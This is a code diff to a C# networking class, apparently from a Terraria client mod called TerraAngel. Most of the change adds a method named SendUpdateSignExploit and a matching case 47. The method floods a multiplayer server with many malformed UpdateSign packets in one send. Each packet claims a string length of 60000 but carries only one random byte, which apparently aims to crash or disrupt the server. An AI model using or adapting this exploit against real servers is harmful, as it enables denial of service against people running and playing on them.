@@ -1,4 +1,5 @@
-﻿using System.IO;
+﻿using System;
+using System.IO;
 using TerraAngel.ID;
 using Terraria.Localization;
 
@@ -106,6 +107,13 @@ public class SpecialNetMessage
                         writer.Write((short)number5);
                     }
                     break;
+                case 47:
+                    writer.Write((short)number);
+                    writer.Write((short)Main.sign[number].x);
+                    writer.Write((short)Main.sign[number].y);
+                    writer.Write7BitEncodedInt(32000);
+                    writer.Write((byte)Random.Shared.Next(0, 256));
+                    break;
             }
 
             int packetLength = (int)writer.BaseStream.Position;
@@ -170,6 +178,65 @@ public class SpecialNetMessage
         {
             NetMessage.SendData(MessageID.PlayerControls, number: Main.myPlayer);
             NetMessage.SendData(MessageID.SyncEquipment, number: Main.myPlayer, number2: Main.LocalPlayer.selectedItem, number3: Main.LocalPlayer.inventory[Main.LocalPlayer.selectedItem].prefix);
+        }
+    }
+
+    public static void SendUpdateSignExploit(int signId, int numOfPackets)
+    {
+        if (Main.netMode == 0)
+        {
+            return;
+        }
+
+        int bufferIndex = 256;
+        byte msgType = MessageID.UpdateSign;
+
+        lock (NetMessage.buffer[bufferIndex])
+        {
+            BinaryWriter writer = NetMessage.buffer[bufferIndex].writer;
+            if (writer == null)
+            {
+                NetMessage.buffer[bufferIndex].ResetWriter();
+                writer = NetMessage.buffer[bufferIndex].writer;
+            }
+
+            
+            writer.BaseStream.Position = 0L;
+            for (var i = 0; i < numOfPackets; i++)
+            {
+                var origPos = writer.BaseStream.Position;
+                writer.BaseStream.Position += 2L;
+                writer.Write((byte)msgType);
+            
+                writer.Write((short)signId);
+                writer.Write((short)Main.sign[signId].x);
+                writer.Write((short)Main.sign[signId].y);
+                writer.Write7BitEncodedInt(60000);
+                writer.Write((byte)Random.Shared.Next(0, 256));
+
+                var newPos = writer.BaseStream.Position;
+                writer.BaseStream.Position = origPos;
+                writer.Write((ushort)(newPos - origPos));
+                writer.BaseStream.Position = newPos;
+            }
+            var totalPacketLength = (int)writer.BaseStream.Position;
+            writer.Flush();
+            
+            if (Main.netMode == 1)
+            {
+                if (Netplay.Connection.Socket.IsConnected())
+                {
+                    try
+                    {
+                        NetMessage.buffer[bufferIndex].spamCount++;
+                        Main.ActiveNetDiagnosticsUI.CountSentMessage(msgType, totalPacketLength);
+                        Netplay.Connection.Socket.AsyncSend(NetMessage.buffer[bufferIndex].writeBuffer, 0, totalPacketLength, Netplay.Connection.ClientWriteCallBack);
+                    }
+                    catch
+                    {
+                    }
+                }
+            }
         }
     }
 }
